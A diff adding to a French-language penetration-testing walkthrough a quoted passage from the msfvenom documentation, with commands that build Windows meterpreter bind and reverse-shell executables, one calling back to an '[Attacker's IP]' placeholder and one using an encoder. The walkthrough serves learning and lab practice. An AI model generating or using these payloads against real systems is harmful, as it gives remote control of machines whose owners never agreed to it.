@@ -963,3 +963,32 @@ Error: The payload could not be generated, check options
 !!! failure "Toujours pas la bonne commande"
     On regarde la [doc officielle](https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html) pour affiner les options.
 
+    !!! quote "How to generate a payload"
+
+        To generate a payload, there are two flags that you must supply (-p and -f):
+
+            The -p flag: Specifies what payload to generate
+
+        To see what payloads are available from Framework, you can do:
+
+            ./msfvenom -l payloads
+
+        The -p flag also supports “-“ as a way to accept a custom payload:
+
+            cat payload_file.bin | ./msfvenom -p - -a x86 --platform win -e x86/shikata_ga_nai -f raw
+
+        The -f flag specifies the format of the payload
+
+        Syntax example:
+
+            ./msfvenom -p windows/meterpreter/bind_tcp -f exe
+
+        To see what formats are supported, you can do the following to find out:
+
+            ./msfvenom --help-formats
+
+        Typically, this is probably how you will use msfvenom:
+
+            $ ./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker's IP] lport=4444 -f exe -o /tmp/my_payload.exe
+
+
